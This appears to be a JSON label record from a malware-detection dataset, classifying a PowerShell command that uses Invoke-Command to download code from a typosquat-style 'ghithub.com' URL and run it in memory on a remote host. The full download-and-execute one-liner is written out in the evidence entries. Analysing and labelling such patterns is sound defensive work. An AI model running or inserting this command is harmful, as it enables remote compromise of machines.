{
  "summary": "The script uses PowerShell remoting to download a script from an external URL and immediately execute it on the target machine.",
  "evidence": [
    {
      "code": "Invoke-Command -ComputerName <remote_system> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject') }",
      "code_explain": "Invoke-Command initiates a remote PowerShell session on <remote_system>. Inside the ScriptBlock, IEX (Invoke‑Expression) evaluates the string returned by (New-Object Net.WebClient).DownloadString(...), which fetches raw PowerShell code from an external HTTP address and runs it in memory. This pattern is a classic downloader/execution technique used by malware to pull and run payloads without writing them to disk.",
      "tag": "DOWNLOADER"
    },
    {
      "code": "Invoke-Command -ComputerName <remote_system> -ScriptBlock { ... }",
      "code_explain": "The use of Invoke-Command with a remote computer name provides remote command execution capability, allowing the attacker to run arbitrary code on another host without interactive login.",
      "tag": "REMOTE_COMMAND_EXECUTION"
    },
    {
      "code": "IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')",
      "code_explain": "Combining IEX with DownloadString executes downloaded content directly in memory, bypassing many file‑based detection mechanisms and representing a defense‑evasion technique.",
      "tag": "DEFENSE_EVASION"
    }
  ],
  "explain": "The script downloads and runs code from an untrusted external URL on a remote system, a well‑known malicious pattern for initial compromise and payload delivery. The combination of remote execution, downloader behavior, and in‑memory execution makes it clearly malicious.",
  "is_malicious": "Malicious",
  "tag": "DOWNLOADER"
}

